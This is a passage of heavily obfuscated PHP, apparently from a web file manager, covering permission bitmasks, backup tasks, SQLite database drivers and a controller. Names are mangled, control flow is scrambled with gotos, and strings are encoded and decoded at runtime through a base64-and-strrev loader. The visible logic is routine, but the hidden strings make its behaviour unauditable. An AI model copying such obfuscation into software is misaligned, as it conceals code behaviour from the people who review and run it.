self::AUTH_SHARE, $dÇšµôÉÖ‚[350] => self::AUTH_COMMENT, $dÇšµôÉÖ‚[1493] => self::AUTH_EVENT, $dÇšµôÉÖ‚[1683] => self::AUTH_ROOT); if (!isset($dâÜÅö«“´[$f™ ¿ˆŞŸÆ])) { return; } goto bŒ˜ÊÜÄ´Ô; Fí’‘ê×ˆÀ: if (($C†¨Æ‹¡Ê & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C†¨Æ‹¡Ê & $F³ØŒå©¯Ö); goto f…ÛÅÜÕâ¿; f…ÛÅÜÕâ¿: } public static function authDisable($cêÍÕÑÁ£”, $Cå­ì…Ã¹°) { if (intval($cêÍÕÑÁ£”) <= 0) { return 0; } return intval($cêÍÕÑÁ£”) & ~$Cå­ì…Ã¹°; } public $optionType = "\123\x79\x73\x74\145\155\56\x73\x6f\165\162\143\x65\101\x75\164\150\x4c\x69\163\164"; public $field = array("\x6e\x61\155\145", "\141\165\164\x68", "\x6c\141\x62\x65\x6c", "\144\151\163\x70\x6c\x61\171", "\163\x79\163\x74\x65\x6d", "\x73\157\162\x74"); public function initData() { $d‰øˆî¤©æ = $this->authDefault(); foreach ($d‰øˆî¤©æ as $B£Œ…ÎêÎ¤) { $this->add($B£Œ…ÎêÎ¤); } } public function listData($dÏèãœÖ°§ = false, $c¹ò±Á†„œ = "\x73\x6f\162\164", $dë‚–œÔÒÑ = false) { return parent::listData($dÏèãœÖ°§, $c¹ò±Á†„œ, $dë‚–œÔÒÑ); } public function update($aô¿ôËè‰É, $A‡‡İ·­¡Ì) { $eéò©Í¦» =& $_SERVER[òÀöí]; $EŠŞ…¥†ù = parent::listData($aô¿ôËè‰É); $EÙĞæ£Óîñ = $this->findByName($A‡‡İ·­¡Ì[$eéò©Í¦»[28]]); if (!$EŠŞ…¥†ù || $EÙĞæ£Óîñ && $EÙĞæ£Óîñ[$eéò©Í¦»[385]] != $EŠŞ…¥†ù[$eéò©Í¦»[385]]) { return !1; } $this->filterAuth($A‡‡İ·­¡Ì[$eéò©Í¦»[394]]); return parent::update($aô¿ôËè‰É, $A‡‡İ·­¡Ì); } public function remove($Aîì¼ã»¹¹) { $b×µ÷²Õ›å = parent::listData($Aîì¼ã»¹¹); if (!$b×µ÷²Õ›å || $b×µ÷²Õ›å[$_SERVER[òÀöí][1145]]) { return !1; } return parent::remove($Aîì¼ã»¹¹); } public function add($e–¨İÈ–ô« = array()) { goto c³·ŞÜ˜‚; F£¬†ÅÒÎ¶: $e–¨İÈ–ô« = array_merge($c«ªŞÜ¾¹‡, $e–¨İÈ–ô«); $e–¨İÈ–ô«[$DñÇÎÍ“¬¿[1686]] = $this->getSort(); $this->filterAuth($e–¨İÈ–ô«[$DñÇÎÍ“¬¿[394]]); goto Bº¦Ëä„ÛË; Bº¦Ëä„ÛË: return parent::insert($e–¨İÈ–ô«); goto AÆµå©Ú¥î; c³·ŞÜ˜‚: $DñÇÎÍ“¬¿ =& $_SERVER[òÀöí]; if ($this->findByName($e–¨İÈ–ô«[$DñÇÎÍ“¬¿[28]])) { return !1; } $c«ªŞÜ¾¹‡ = array($DñÇÎÍ“¬¿[28] => $DñÇÎÍ“¬¿[33], $DñÇÎÍ“¬¿[394] => 1, $DñÇÎÍ“¬¿[1684] => $DñÇÎÍ“¬¿[1673], $DñÇÎÍ“¬¿[1685] => 1, $DñÇÎÍ“¬¿[1145] => 0, $DñÇÎÍ“¬¿[1686] => 0); goto F£¬†ÅÒÎ¶; AÆµå©Ú¥î: } private function getSort() { $f¥½Õ…«­Š =& $_SERVER[òÀöí]; $F¶¹Ÿ–¯Úˆ = parent::listData(); $bò¾‰ä§¿¾ = array_to_keyvalue($F¶¹Ÿ–¯Úˆ, $f¥½Õ…«­Š[33], $f¥½Õ…«­Š[1686]); return empty($bò¾‰ä§¿¾) ? 0 : max($bò¾‰ä§¿¾) + 1; } private function filterAuth(&$EÀŒ¸Ì­¨‹) { goto B¼£˜¾…ŒÒ; f‰ó¤˜Ú½: foreach ($b´É¹ÆÈ·¨ as $C„™®âï ÷) { if ($EÀŒ¸Ì­¨‹ & $C„™®âï ÷) { $AîÆàÌÃ¸Ö[] = $C„™®âï ÷; } } if (in_array(self::AUTH_ROOT, $AîÆàÌÃ¸Ö)) { $EÀŒ¸Ì­¨‹ = array_sum($b´É¹ÆÈ·¨); return; } $d×Õ©Ã§ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto f“‚ÚƒŞß; f“‚ÚƒŞß: foreach ($AîÆàÌÃ¸Ö as $C„™®âï ÷) { if (isset($d×Õ©Ã§[$C„™®âï ÷])) { $AîÆàÌÃ¸Ö = array_merge($AîÆàÌÃ¸Ö, $d×Õ©Ã§[$C„™®âï ÷]); } } $AîÆàÌÃ¸Ö[] = self::AUTH_SHOW; $EÀŒ¸Ì­¨‹ = array_sum(array_unique($AîÆàÌÃ¸Ö)); goto B¯‡ùÙÑ‚®; B¼£˜¾…ŒÒ: if (!$EÀŒ¸Ì­¨‹) { return; } $b´É¹ÆÈ·¨ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $AîÆàÌÃ¸Ö = array(); goto f‰ó¤˜Ú½; B¯‡ùÙÑ‚®: } public function sort($CŞ¹ÀË¨‡…, $d©‚ÓÓ£‰…) { return parent::update($CŞ¹ÀË¨‡…, $d©‚ÓÓ£‰…); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\142\x61\x63\153\165\x70\114\151\x73\164"; public $field = array("\x69\157", "\x6e\141\x6d\x65", "\x73\164\141\164\x75\x73", "\143\x6f\156\x74\145\x6e\164", "\162\x65\163\x75\154\164", "\x74\x69\x6d\x65\x46\162\x6f\x6d", "\164\x69\155\145\x54\157"); public function config() { goto B”Š¨¢‹£Ï; bá¹‚—ƒÇ¤: $cìêÀ•Š = is_array($cìêÀ•Š) ? $cìêÀ•Š : array(); if (!isset($cìêÀ•Š[$CÅ¿Ò«®‡É[711]])) { $cìêÀ•Š[$CÅ¿Ò«®‡É[711]] = $CÅ¿Ò«®‡É[86]; } $Cñ¬ŠÔœ†† = array(); goto bĞ©šĞ¡øÈ; B”Š¨¢‹£Ï: $CÅ¿Ò«®‡É =& $_SERVER[òÀöí]; $cìêÀ•Š = Model($CÅ¿Ò«®‡É[1102])->get($CÅ¿Ò«®‡É[732]); $cìêÀ•Š = json_decode($cìêÀ•Š, !0); goto bá¹‚—ƒÇ¤; bĞ©šĞ¡øÈ: Action($CÅ¿Ò«®‡É[1687])->taskInit(); $DÒã…®‰˜œ = Model($CÅ¿Ò«®‡É[1688])->listData(); foreach ($DÒã…®‰˜œ as $fÁŸ‡‘¹Æ) { if ($fÁŸ‡‘¹Æ[$CÅ¿Ò«®‡É[1145]] == $CÅ¿Ò«®‡É[86] && $fÁŸ‡‘¹Æ[$CÅ¿Ò«®‡É[1493]] == $CÅ¿Ò«®‡É[1689]) { $Cñ¬ŠÔœ†† = $fÁŸ‡‘¹Æ; break; } } goto D¿Ú³ËÂÜµ; D¿Ú³ËÂÜµ: if (isset($Cñ¬ŠÔœ††[$CÅ¿Ò«®‡É[195]])) { $Cñ¬ŠÔœ††[$CÅ¿Ò«®‡É[195]] = json_decode($Cñ¬ŠÔœ††[$CÅ¿Ò«®‡É[195]], !0); } if (isset($cìêÀ•Š[$CÅ¿Ò«®‡É[195]])) { $Cñ¬ŠÔœ††[$CÅ¿Ò«®‡É[195]][$CÅ¿Ò«®‡É[1478]] = $cìêÀ•Š[$CÅ¿Ò«®‡É[195]]; unset($cìêÀ•Š[$CÅ¿Ò«®‡É[195]]); } return array_merge($Cñ¬ŠÔœ††, $cìêÀ•Š); goto Dæ‰š˜×…È; Dæ‰š˜×…È: } public function listData($D”µŸàÈ›˜ = false, $a¦ƒÎëàÙÜ = "\155\157\x64\151\146\171\x54\151\155\x65", $C„†ÏÉì¢¥ = false) { return parent::listData($D”µŸàÈ›˜, $a¦ƒÎëàÙÜ, !0); } public function lastItem() { $e¾ŠùÊ¬’ù = $this->listData(); return !empty($e¾ŠùÊ¬’ù[0]) ? $e¾ŠùÊ¬’ù[0] : null; } public function kill($EÃ’„ø“ƒ¬) { goto e¯é¯ÂŞ‡Ô; dÍ²À¥õš©: return $this->remove($EÃ’„ø“ƒ¬); goto dÄœ†â¶º„; e¯é¯ÂŞ‡Ô: $E„ÉĞİ¸²ˆ =& $_SERVER[òÀöí]; $B¡ÜğéË‘  = $this->listData($EÃ’„ø“ƒ¬); if (!$B¡ÜğéË‘  || empty($B¡ÜğéË‘ [$E„ÉĞİ¸²ˆ[28]])) { return !0; } goto bñ“×»†ëö; eƒ¢š¯¤: $eÁÅáíƒË = $B¡ÜğéË‘ [$E„ÉĞİ¸²ˆ[28]]; $F¼£Ï»ƒ İ = TEMP_FILES . $E„ÉĞİ¸²ˆ[728] . $eÁÅáíƒË . $E„ÉĞİ¸²ˆ[8]; IO::remove($F¼£Ï»ƒ İ, !1); goto dÍ²À¥õš©; bñ“×»†ëö: Task::kill($E„ÉĞİ¸²ˆ[731]); Task::kill($E„ÉĞİ¸²ˆ[748]); Task::kill($E„ÉĞİ¸²ˆ[763]); goto eƒ¢š¯¤; dÄœ†â¶º„: } public function remove($f¾”šŒó†´) { $D«™ëç’ = $this->listData($f¾”šŒó†´); if (!$D«™ëç’) { return !0; } return $this->backupRemove($D«™ëç’); } private function backupRemove($døã£ùİ°ä) { $Fé÷åŒ¼º =& $_SERVER[òÀöí]; parent::remove($døã£ùİ°ä[$Fé÷åŒ¼º[385]]); $còìõÃÃŠ÷ = "\173\151\157\x3a{$døã£ùİ°ä[$Fé÷åŒ¼º[710]]}\x7d\57\144\x61\x74\x61\142\x61\163\145\x2f\142\x61\143\x6b\165\x70\x5f" . $døã£ùİ°ä[$Fé÷åŒ¼º[28]]; IO::remove($còìõÃÃŠ÷, !1); return !0; } public function start() { goto C¿§Í¼¼Ñ«; båóº´»µ: $E„çÚØÙèŞ = new Backup(); $E„çÚØÙèŞ->keep(); $e¬„›Ó²¨Ş = $E„çÚØÙèŞ->db(); goto B‡àÛß”Şª; C¿§Í¼¼Ñ«: $c”ó³«Ç—‘ =& $_SERVER[òÀöí]; if ($GLOBALS[$c”ó³«Ç—‘[6]][$c”ó³«Ç—‘[87]][$c”ó³«Ç—‘[1690]] != $c”ó³«Ç—‘[86]) { return !0; } $dÍ½˜Ãéí = $this->config(); goto FğãÂâŠÉŠ; FğãÂâŠÉŠ: if (!$dÍ½˜Ãéí || $dÍ½˜Ãéí[$c”ó³«Ç—‘[1475]] != $c”ó³«Ç—‘[86]) { return !1; } $AÄŠä†Ş§“ = $this->process(); foreach ($AÄŠä†Ş§“ as $b×ÙÇá‚Î) { if ($b×ÙÇá‚Î) { return Task::restart($b×ÙÇá‚Î[$c”ó³«Ç—‘[385]]); } } goto båóº´»µ; B‡àÛß”Şª: if ($e¬„›Ó²¨Ş) { $e¬„›Ó²¨Ş = $E„çÚØÙèŞ->dbFile(); if ($e¬„›Ó²¨Ş && $dÍ½˜Ãéí[$c”ó³«Ç—‘[711]] == $c”ó³«Ç—‘[486]) { $e¬„›Ó²¨Ş = $E„çÚØÙèŞ->file(); } } Backup::set(array($c”ó³«Ç—‘[708] => 1, $c”ó³«Ç—‘[465] => time())); return !0; goto A”ÂÙ†©Ö; A”ÂÙ†©Ö: } public function process() { $cš¼óŠĞÙ° =& $_SERVER[òÀöí]; return array($cš¼óŠĞÙ°[713] => Task::get($cš¼óŠĞÙ°[731]), $cš¼óŠĞÙ°[716] => Task::get($cš¼óŠĞÙ°[748]), $cš¼óŠĞÙ°[173] => Task::get($cš¼óŠĞÙ°[763])); } public function restore() { $däìö™Ü‘ =& $_SERVER[òÀöí]; ActionCall($däìö™Ü‘[997], !0, 1); ActionCall($däìö™Ü‘[997], !0, 0); } } goto DÇÙÑŸíê; aâØÑ¨¯í: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto CÀ‰Éâª×ä; CÀ‰Éâª×ä: $B†ôÃÇ’©È =& $_SERVER[òÀöí]; global $in, $config; $this->config =& $config; goto b±Æ¢ÆŠÔ; BÇ‘ÂƒİŸ: $this->tpl = TEMPLATE . MOD . $B†ôÃÇ’©È[8]; $this->_classObjectID = mt_rand(0, 10000); goto A²ÀÂ³•„ä; b±Æ¢ÆŠÔ: $this->in =& $in; $this->values[$B†ôÃÇ’©È[6]] =& $config; $this->values[$B†ôÃÇ’©È[7]] =& $in; goto BÇ‘ÂƒİŸ; A²ÀÂ³•„ä: } public function loadClass($f®ñ¶éä•‹) { if (1 === func_num_args()) { $this->{$f®ñ¶éä•‹} = new $f®ñ¶éä•‹(); } else { $CÙ¦…½¸íò = new ReflectionClass($f®ñ¶éä•‹); $Cğœ„óÒí = func_get_args(); array_shift($Cğœ„óÒí); $this->{$f®ñ¶éä•‹} = $CÙ¦…½¸íò->newInstanceArgs($Cğœ„óÒí); } return $this->{$f®ñ¶éä•‹}; } protected function assign($bßÕº£½¥, $DÇÛ‡Ñ¯¬) { $this->values[$bßÕº£½¥] = $DÇÛ‡Ñ¯¬; } protected function display($dìÅòÚƒÙ ) { ob_end_clean(); extract($this->values); require $this->tpl . $dìÅòÚƒÙ ; } } class DbSqliteBase extends Db { public function __construct($dëÎ¬ÄÈˆŠ = '') { $dä¤›ºØİŸ =& $_SERVER[òÀöí]; if (!extension_loaded($dä¤›ºØİŸ[9])) { think_exception(think_lang($dä¤›ºØİŸ[10]) . $dä¤›ºØİŸ[11]); } if (!empty($dëÎ¬ÄÈˆŠ)) { if (!isset($dëÎ¬ÄÈˆŠ[$dä¤›ºØİŸ[12]])) { $dëÎ¬ÄÈˆŠ[$dä¤›ºØİŸ[12]] = 438; } $this->config = $dëÎ¬ÄÈˆŠ; if (empty($this->config[$dä¤›ºØİŸ[13]])) { $this->config[$dä¤›ºØİŸ[13]] = array(); } } } public function connect($Eœ®ğÆ„Ïù = '', $fÆ‰“²÷ = 0) { $eà“‰°Íˆ¯ =& $_SERVER[òÀöí]; if (!isset($this->linkID[$fÆ‰“²÷])) { goto fíàæ‹Ãî; fíàæ‹Ãî: if (empty($Eœ®ğÆ„Ïù)) { $Eœ®ğÆ„Ïù = $this->config; } $Aè´®ç›‹ = !empty($Eœ®ğÆ„Ïù[$eà“‰°Íˆ¯[13]][$eà“‰°Íˆ¯[14]]) ? $Eœ®ğÆ„Ïù[$eà“‰°Íˆ¯[13]][$eà“‰°Íˆ¯[14]] : $this->pconnect; $føÃÀ•¹É§ = $Aè´®ç›‹ ? $eà“‰°Íˆ¯[15] : $eà“‰°Íˆ¯[16]; goto F¶‚áî‰®; F¶‚áî‰®: $this->linkID[$fÆ‰“²÷] = $føÃÀ•¹É§($Eœ®ğÆ„Ïù[$eà“‰°Íˆ¯[17]], $Eœ®ğÆ„Ïù[$eà“‰°Íˆ¯[12]]); if (!$this->linkID[$fÆ‰“²÷]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cÙ¸Ä¯ĞÂ; cÙ¸Ä¯ĞÂ: @sqlite_busy_timeout($this->linkID[$fÆ‰“²÷], 30000); if (1 != think_config($eà“‰°Íˆ¯[18])) { unset($this->config); } goto bÂ¢¬Íß³ê; bÂ¢¬Íß³ê: } return $this->linkID[$fÆ‰“²÷]; } public function free() { $this->queryID = null; } public function query($B÷óñÌÃÌï) { goto E¾¾ŒõÇ˜Ô; bÌ’Ğôñò¸: think_status($c°¯Ò„Ñ…ß[20]); $this->queryID = sqlite_query($this->_linkID, $B÷óñÌÃÌï); $this->debug(); goto E«î ŸŒ­; E«î ŸŒ­: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $AòÍÀÈ”–¤ = $this->getAll(); return $AòÍÀÈ”–¤; } goto A…¡Ô•£ÁŠ; E¾¾ŒõÇ˜Ô: $c°¯Ò„Ñ…ß =& $_SERVER[òÀöí]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c«‘¿¨«°½; c«‘¿¨«°½: $this->queryStr = $B÷óñÌÃÌï; if ($this->queryID) { $this->free(); } think_action_status($c°¯Ò„Ñ…ß[19], 1); goto bÌ’Ğôñò¸; A…¡Ô•£ÁŠ: } public function execute($D»µùÎÓ©) { goto B±ªÌôø™×; a™„°È† …: think_status($EÉù¾¬–¶å[20]); $fÈóğå–ÍÄ = sqlite_exec($this->_linkID, $D»µùÎÓ©); $this->debug(); goto dÏƒ¬Æ××; B±ªÌôø™×: $EÉù¾¬–¶å =& $_SERVER[òÀöí]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto EïƒÌ¢ó®÷; EïƒÌ¢ó®÷: $this->queryStr = $D»µùÎÓ©; if ($this->queryID) { $this->free(); } think_action_status($EÉù¾¬–¶å[21], 1); goto a™„°È† …; dÏƒ¬Æ××: if (!1 === $fÈóğå–ÍÄ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto D¼Õ¿›ÁÔ; D¼Õ¿›ÁÔ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[òÀöí][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B˜§¼•¥êÜ = sqlite_query($this->_linkID, $_SERVER[òÀöí][23]); if (!$B˜§¼•¥êÜ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÉ‚ˆÚˆğê = sqlite_query($this->_linkID, $_SERVER[òÀöí][24]); if (!$BÉ‚ˆÚˆğê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $a¨ÖíÑå† = array(); if ($this->numRows > 0) { for ($Dç˜÷ Œ = 0; $Dç˜÷ Œ < $this->numRows; $Dç˜÷ Œ++) { $a¨ÖíÑå†[$Dç˜÷ Œ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $a¨ÖíÑå†; } public function getFields($FÃì²¼Ù‘Û) { $aÏ»ëï…Üƒ =& $_SERVER[òÀöí]; $aĞ›ğÙ’àÔ = $this->query($aÏ»ëï…Üƒ[25] . $FÃì²¼Ù‘Û . $aÏ»ëï…Üƒ[26]); $aÚôŠ”»Ñ = array(); if ($aĞ›ğÙ’àÔ) { foreach ($aĞ›ğÙ’àÔ as $b¿é°’ß±… => $aò‘¾°Ì) { $aÚôŠ”»Ñ[$aò‘¾°Ì[$aÏ»ëï…Üƒ[27]]] = array($aÏ»ëï…Üƒ[28] => $aò‘¾°Ì[$aÏ»ëï…Üƒ[27]], $aÏ»ëï…Üƒ[29] => $aò‘¾°Ì[$aÏ»ëï…Üƒ[30]], $aÏ»ëï…Üƒ[31] => (bool) ($aò‘¾°Ì[$aÏ»ëï…Üƒ[32]] === $aÏ»ëï…Üƒ[33]), $aÏ»ëï…Üƒ[34] => $aò‘¾°Ì[$aÏ»ëï…Üƒ[35]], $aÏ»ëï…Üƒ[36] => strtolower($aò‘¾°Ì[$aÏ»ëï…Üƒ[37]]) == $aÏ»ëï…Üƒ[38], $aÏ»ëï…Üƒ[39] => strtolower($aò‘¾°Ì[$aÏ»ëï…Üƒ[40]]) == $aÏ»ëï…Üƒ[41]); } } return $aÚôŠ”»Ñ; } public function getTables($föè„¶ÉİÉ = '') { $FĞÃñ¢¿ =& $_SERVER[òÀöí]; $e¼†‡ò± = $this->query($FĞÃñ¢¿[42] . $FĞÃñ¢¿[43] . $FĞÃñ¢¿[44]); $fƒŸçÛåÛŠ = array(); foreach ($e¼†‡ò± as $BÇÔÖ˜»Ëæ => $Bâƒù…ØÁ¹) { $fƒŸçÛåÛŠ[$BÇÔÖ˜»Ëæ] = current($Bâƒù…ØÁ¹); } return $fƒŸçÛåÛŠ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $c³õ®²é =& $_SERVER[òÀöí]; $c†ÍéñÛ£Ø = sqlite_last_error($this->_linkID); $this->error = $c†ÍéñÛ£Ø . $c³õ®²é[4] . sqlite_error_string($c†ÍéñÛ£Ø); if ($c³õ®²é[33] != $this->queryStr) { $this->error .= LNG($c³õ®²é[45]) . $this->queryStr; } think_trace($this->error, $c³õ®²é[33], $c³õ®²é[46]); return $this->error; } public function escapeString($FŸÇ–É£ç) { return sqlite_escape_string($FŸÇ–É£ç); } public function parseLimit($F¬œĞ³„ô) { $b¶ßôÅá˜ =& $_SERVER[òÀöí]; $eÆÏŸªÁ“¹ = $b¶ßôÅá˜[33]; if (!empty($F¬œĞ³„ô)) { $F¬œĞ³„ô = explode($b¶ßôÅá˜[47], $F¬œĞ³„ô); if (count($F¬œĞ³„ô) > 1) { $eÆÏŸªÁ“¹ .= $b¶ßôÅá˜[48] . $F¬œĞ³„ô[1] . $b¶ßôÅá˜[49] . $F¬œĞ³„ô[0] . $b¶ßôÅá˜[50]; } else { $eÆÏŸªÁ“¹ .= $b¶ßôÅá˜[48] . $F¬œĞ³„ô[0] . $b¶ßôÅá˜[50]; } } return $eÆÏŸªÁ“¹; } } class DbSqlite3Base extends Db { public function __construct($D¿¶²²Ğ¾© = '') { $d®ÒŠœğ¾µ =& $_SERVER[òÀöí]; if (!class_exists($d®ÒŠœğ¾µ[51])) { think_exception(think_lang($d®ÒŠœğ¾µ[10]) . $d®ÒŠœğ¾µ[52]); } if (!empty($D¿¶²²Ğ¾©)) { if (!isset($D¿¶²²Ğ¾©[$d®ÒŠœğ¾µ[12]])) { $D¿¶²²Ğ¾©[$d®ÒŠœğ¾µ[12]] = 438; } $this->config = $D¿¶²²Ğ¾©; if (empty($this->config[$d®ÒŠœğ¾µ[13]])) { $this->config[$d®ÒŠœğ¾µ[13]] = array(); } } } public function connect($cØíŠì®­™ = '', $déÇÀ÷¢ôË = 0) { $b÷ß‚ïš· =& $_SERVER[òÀöí]; if (!isset($this->linkID[$déÇÀ÷¢ôË])) { if (empty($cØíŠì®­™)) { $cØíŠì®­™ = $this->config; } $this->linkID[$déÇÀ÷¢ôË] = new SQLite3($cØíŠì®­™[$b÷ß‚ïš·[17]]); if (!$this->linkID[$déÇÀ÷¢ôË]) { think_exception($this->linkID[$déÇÀ÷¢ôË]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$déÇÀ÷¢ôË]->busyTimeout(30000); if (1 != think_config($b÷ß‚ïš·[18])) { unset($this->config); } } return $this->linkID[$déÇÀ÷¢ôË]; } public function free() { $this->queryID = null; } public function query($a¿ä‹ÓÜÕŒ) { goto F¬Òíéªİ; F¬Òíéªİ: $eŒÆªöÒ—¤ =& $_SERVER[òÀöí]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eˆÄ–‹õœä; Eò£Ùï³¶¦: if (!1 === $this->queryID) { $this->error(); return !1; } else { $c‚½Å„²¤ = $this->getAll(); $this->numRows = count($c‚½Å„²¤); return $c‚½Å„²¤; } goto Cî· á­–‚; eˆÄ–‹õœä: $this->queryStr = $a¿ä‹ÓÜÕŒ; if ($this->queryID) { $this->free(); } think_action_status($eŒÆªöÒ—¤[19], 1); goto d—„ñ•Ò«; d—„ñ•Ò«: think_status($eŒÆªöÒ—¤[20]); $this->queryID = $this->_linkID->query($a¿ä‹ÓÜÕŒ); $this->debug(); goto Eò£Ùï³¶¦; Cî· á­–‚: } public function execute($B†æ¡ç‘š) { goto fî¦ÕÁâá; A‡˜Ü‰é¹‘: if (!1 === $D¹Äáª¦‘) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto b÷ª‹ÀšÙ; fî¦ÕÁâá: $aÀÃ§Ù›õ› =& $_SERVER[òÀöí]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto fé®‘„×; fç³øŠÚ‰Æ: think_status($aÀÃ§Ù›õ›[20]); $D¹Äáª¦‘ = $this->_linkID->exec($B†æ¡ç‘š); $this->debug(); goto A‡˜Ü‰é¹‘; fé®‘„×: $this->queryStr = $B†æ¡ç‘š; if ($this->queryID) { $this->free(); } think_action_status($aÀÃ§Ù›õ›[21], 1); goto fç³øŠÚ‰Æ; b÷ª‹ÀšÙ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[òÀöí][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $aàÈßØãÉà = $this->_linkID->query($_SERVER[òÀöí][23]); if (!$aàÈßØãÉà) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Cƒ¸·ˆ¾Ä = $this->_linkID->query($_SERVER[òÀöí][24]); if (!$Cƒ¸·ˆ¾Ä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $e“íà½”ó = array(); while ($B‰š†À¯…í = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $e“íà½”ó[] = $B‰š†À¯…í; } $this->queryID->reset(); return $e“íà½”ó; } public function getFields($fŠï‚•¾ïâ) { $Eñ÷¢Š‹±‘ =& $_SERVER[òÀöí]; $bÎßîªÆó = $this->query($Eñ÷¢Š‹±‘[25] . $fŠï‚•¾ïâ . $Eñ÷¢Š‹±‘[26]); $Aõ×·ß³ = array(); if ($bÎßîªÆó) { foreach ($bÎßîªÆó as $CâÊ—ÊøÊï => $cŒÍĞµÜ) { $Aõ×·ß³[$cŒÍĞµÜ[$Eñ÷¢Š‹±‘[28]]] = array($Eñ÷¢Š‹±‘[28] => $cŒÍĞµÜ[$Eñ÷¢Š‹±‘[28]], $Eñ÷¢Š‹±‘[29] => $cŒÍĞµÜ[$Eñ÷¢Š‹±‘[29]], $Eñ÷¢Š‹±‘[31] => (bool) ($cŒÍĞµÜ[$Eñ÷¢Š‹±‘[31]] === $Eñ÷¢Š‹±‘[33]), $Eñ÷¢Š‹±‘[34] => $cŒÍĞµÜ[$Eñ÷¢Š‹±‘[53]], $Eñ÷¢Š‹±‘[36] => (bool) $cŒÍĞµÜ[$Eñ÷¢Š‹±‘[54]], $Eñ÷¢Š‹±‘[39] => (bool) $cŒÍĞµÜ[$Eñ÷¢Š‹±‘[54]]); } } return $Aõ×·ß³; } public function getTables($B§†ôäÒÅ = '') { $E™’ÂîĞ¶ =& $_SERVER[òÀöí]; $E”÷Ãêª‘ = $this->query($E™’ÂîĞ¶[42] . $E™’ÂîĞ¶[43] . $E™’ÂîĞ¶[44]); $cˆ‹›«ŞŠ˜ = array(); foreach ($E”÷Ãêª‘ as $dİÓ¸¾„‡” => $d ÷ášò¸Ç) { $cˆ‹›«ŞŠ˜[$dİÓ¸¾„‡”] = current($d ÷ášò¸Ç); } return $cˆ‹›«ŞŠ˜; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $E®‘±•Á¦ =& $_SERVER[òÀöí]; $this->error = $this->_linkID->lastErrorMsg(); if ($E®‘±•Á¦[33] != $this->queryStr) { $this->error .= LNG($E®‘±•Á¦[45]) . $this->queryStr; } think_trace($this->error, $E®‘±•Á¦[33], $E®‘±•Á¦[46]); return $this->error; } public function escapeString($Aê’Ö¡‚¡­) { $aˆ§‹ÖÔ»É =& $_SERVER[òÀöí]; if ($this->_linkID) { return $this->_linkID->escapeString($Aê’Ö¡‚¡­); } return str_ireplace($aˆ§‹ÖÔ»É[55], $aˆ§‹ÖÔ»É[56], $Aê’Ö¡‚¡­); } public function parseLimit($aëëá„´‚¸) { $bâ‹„½¿Š =& $_SERVER[òÀöí]; $d×Ñ—Îåœ = $bâ‹„½¿Š[33]; if (!empty($aëëá„´‚¸)) { $aëëá„´‚¸ = explode($bâ‹„½¿Š[47], $aëëá„´‚¸); if (count($aëëá„´‚¸) > 1) { $d×Ñ—Îåœ .= $bâ‹„½¿Š[48] . $aëëá„´‚¸[1] . $bâ‹„½¿Š[49] . $aëëá„´‚¸[0] . $bâ‹„½¿Š[50]; } else { $d×Ñ—Îåœ .= $bâ‹„½¿Š[48] . $aëëá„´‚¸[0] . $bâ‹„½¿Š[50]; } } return $d×Ñ—Îåœ; } } goto C¬±æŞ¦‚î; Eç¼¹ÌÆÙâ: $E†ßÈ°ĞÙ = strrev(base64_decode($_SERVER[ÉØ›ù‘ºø][0])); function binCheckNeq($càøô¶¢˜, $DËñÑë¬÷‰) { return $càøô¶¢˜ != $DËñÑë¬÷‰; } $_SERVER[$_SERVER[ÉØ›ù‘ºø][1]] = $E†ßÈ°ĞÙ($_SERVER[$_SERVER[ÉØ›ù‘ºø][2]]); goto D­–ñŠ«Ï; C¬±æŞ¦‚î: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $cêÌâõìèÃ =& $_SERVER[òÀöí]; $this->objectDriver = array($cêÌâõìèÃ[57], $cêÌâõìèÃ[58], $cêÌâõìèÃ[59], $cêÌâõìèÃ[60], $cêÌâõìèÃ[61], $cêÌâõìèÃ[62], $cêÌâõìèÃ[63], $cêÌâõìèÃ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($cÁŠ¯›“Ò’) { if (in_array($this->getType(), $this->objectDriver)) { return 